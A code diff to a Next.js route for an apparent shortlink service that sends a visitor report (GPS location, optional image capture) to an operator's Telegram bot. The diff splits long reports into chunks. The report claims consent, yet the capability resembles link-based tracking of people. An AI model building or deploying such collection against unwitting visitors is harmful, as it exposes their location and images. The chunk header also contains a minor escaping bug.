@@ -6,7 +6,8 @@ import { normalizeCategories, type CookieCategories } from "@/lib/cookie-consent
 export const runtime = "nodejs";
 export const dynamic = "force-dynamic";
 
-const TELEGRAM_TIMEOUT_MS = 12_000;
+const TELEGRAM_TIMEOUT_MS = 30_000;
+const TELEGRAM_TEXT_LIMIT = 3_800;
 const MAX_IMAGE_BYTES = 5 * 1024 * 1024;
 const COOKIE_NAME = "shortlink_consent";
 const COOKIE_SECRET = process.env.COOKIE_CONSENT_SECRET || process.env.AUTH_SECRET || process.env.NEXTAUTH_SECRET;
@@ -134,6 +135,56 @@ function parseGps(value: unknown): Gps | null {
       ? { accuracy: Math.min(accuracy, 1_000_000) }
       : {}),
   };
+}
+
+function splitTelegramText(value: string, maxLength = TELEGRAM_TEXT_LIMIT): string[] {
+  const chunks: string[] = [];
+  let current = "";
+
+  for (const sourceLine of value.split("\n")) {
+    let line = sourceLine;
+    while (line.length > maxLength) {
+      if (current) {
+        chunks.push(current);
+        current = "";
+      }
+      chunks.push(line.slice(0, maxLength));
+      line = line.slice(maxLength);
+    }
+
+    const candidate = current ? current + "\n" + line : line;
+    if (candidate.length > maxLength) {
+      if (current) chunks.push(current);
+      current = line;
+    } else {
+      current = candidate;
+    }
+  }
+
+  if (current) chunks.push(current);
+  return chunks;
+}
+
+async function sendTelegramRequest(
+  token: string,
+  method: string,
+  body: BodyInit,
+  signal: AbortSignal,
+): Promise<void> {
+  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
+    method: "POST",
+    body,
+    signal,
+  });
+  const result = await response.json().catch(() => null) as { ok?: boolean; description?: string } | null;
+  if (!response.ok || result?.ok !== true) {
+    console.error("Telegram report delivery failed", {
+      method,
+      status: response.status,
+      description: result?.description?.slice(0, 240),
+    });
+    throw new Error("TELEGRAM_DELIVERY_FAILED");
+  }
 }
 
 function parseImage(value: unknown): { data: string; mime: string } | null {
@@ -278,36 +329,34 @@ export async function POST(req: Request) {
     "━━━━━━━━━━━━━━━━━━━━",
     "Sent only after explicit consent.",
   ];
-  const caption = lines.join("\n").slice(0, 1024);
+  const fullReport = lines.join("\n");
 
   const controller = new AbortController();
   const timeout = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
   try {
-    const endpoint = `https://api.telegram.org/bot${botToken}/${image ? "sendPhoto" : "sendMessage"}`;
-    let telegramResponse: Response;
-
+    // Send the optional image separately. Telegram photo captions are limited
+    // to 1,024 characters and would otherwise silently truncate the report.
     if (image) {
       const form = new FormData();
       form.set("chat_id", chatId);
-      form.set("caption", caption);
       form.set("photo", new Blob([Buffer.from(image.data, "base64")], { type: image.mime }), "capture");
-      telegramResponse = await fetch(endpoint, { method: "POST", body: form, signal: controller.signal });
-    } else {
-      telegramResponse = await fetch(endpoint, {
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: lines.join("\n").slice(0, 4096), disable_web_page_preview: true }),
-        signal: controller.signal,
-      });
+      await sendTelegramRequest(botToken, "sendPhoto", form, controller.signal);
     }
 
-    const result = await telegramResponse.json().catch(() => null) as { ok?: boolean; description?: string } | null;
-    if (!telegramResponse.ok || result?.ok !== true) {
-      console.error("Telegram delivery failed", { status: telegramResponse.status, description: result?.description });
-      return NextResponse.json({ error: "Telegram gagal menerima laporan. Periksa token, chat ID, dan akses bot." }, { status: 502 });
+    // Telegram text messages are limited to 4,096 characters. Split on line
+    // boundaries and deliver every chunk sequentially instead of truncating.
+    const chunks = splitTelegramText(fullReport);
+    for (let index = 0; index < chunks.length; index += 1) {
+      const form = new FormData();
+      form.set("chat_id", chatId);
+      form.set("text", chunks.length > 1
+        ? `Laporan lengkap Shortlink (${index + 1}/${chunks.length})\\n\\n${chunks[index]}`
+        : chunks[index]);
+      form.set("disable_web_page_preview", "true");
+      await sendTelegramRequest(botToken, "sendMessage", form, controller.signal);
     }
 
-    return NextResponse.json({ success: true, telegram: true });
+    return NextResponse.json({ success: true, telegram: true, messagesSent: chunks.length, imageSent: Boolean(image) });
   } catch (error) {
     const timedOut = error instanceof Error && error.name === "AbortError";
     console.error("POST /api/snap Telegram request failed", { timedOut });
